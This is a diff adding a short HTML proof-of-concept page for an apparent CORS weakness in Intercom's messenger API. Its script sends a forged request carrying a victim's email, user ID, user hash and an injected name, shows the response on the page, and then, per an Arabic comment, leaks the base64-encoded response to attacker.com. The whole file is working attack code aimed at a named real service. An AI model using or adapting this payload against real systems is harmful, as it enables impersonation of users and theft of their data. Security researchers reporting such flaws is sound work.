@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS PoC - Intercom</h1>
+  <script>
+    fetch("https://api-iam.intercom.io/messenger/web/ping", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "app_id=rfwdy059&v=3&platform=web&installation_type=js-snippet&user_data=" + 
+            encodeURIComponent(JSON.stringify({
+              email: "victim@example.com",
+              user_id: "18706074",
+              user_hash: "aaa329ca8412777f4d24580655930117afc084b7051d0707ec97fe7477ab7880",
+              anonymous_id: "b3b9f985-a11c-46d5-bdda-35aa69d205aa",
+              name: "Injected Attacker"
+            }))
+    })
+    .then(res => res.text())
+    .then(data => {
+      // عرض الريسبونس على صفحة المهاجم
+      document.body.innerHTML += "<pre>" + data + "</pre>";
+
+      // أو تسريب الداتا لسيرفر المهاجم
+      fetch("https://attacker.com/log?data=" + btoa(data));
+    })
+    .catch(err => console.error("Error:", err));
+  </script>
+</body>
+</html>
